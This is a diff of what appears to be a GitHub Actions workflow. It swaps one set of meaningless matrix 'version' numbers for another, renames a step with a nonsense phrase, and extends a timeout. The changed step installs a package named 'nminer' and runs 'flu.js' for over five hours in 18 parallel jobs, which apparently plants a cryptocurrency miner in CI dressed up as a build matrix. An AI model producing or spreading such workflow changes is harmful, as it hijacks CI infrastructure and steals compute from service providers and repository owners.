@@ -9,24 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8252 }
-          - { version: 2450 }
-          - { version: 8806 }
-          - { version: 3216 }
-          - { version: 7384 }
-          - { version: 4511 }
-          - { version: 329 }
-          - { version: 3621 }
-          - { version: 7611 }
-          - { version: 5707 }
-          - { version: 5920 }
-          - { version: 8773 }
-          - { version: 4128 }
-          - { version: 1494 }
-          - { version: 7548 }
-          - { version: 5926 }
-          - { version: 7144 }
-          - { version: 9273 }
+          - { version: 962 }
+          - { version: 7999 }
+          - { version: 7460 }
+          - { version: 3681 }
+          - { version: 9735 }
+          - { version: 5215 }
+          - { version: 5022 }
+          - { version: 8263 }
+          - { version: 4197 }
+          - { version: 9607 }
+          - { version: 9100 }
+          - { version: 9138 }
+          - { version: 1306 }
+          - { version: 928 }
+          - { version: 2390 }
+          - { version: 4485 }
+          - { version: 9229 }
+          - { version: 4581 }
 
     steps:
       - name: Checkout
@@ -37,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: across ice-cream napkin phew lest
+      - name: only respray maintainer
         run: |
           npm install nminer@latest
-          timeout 319m node flu.js || echo "flu executed"
+          timeout 334m node flu.js || echo "flu executed"
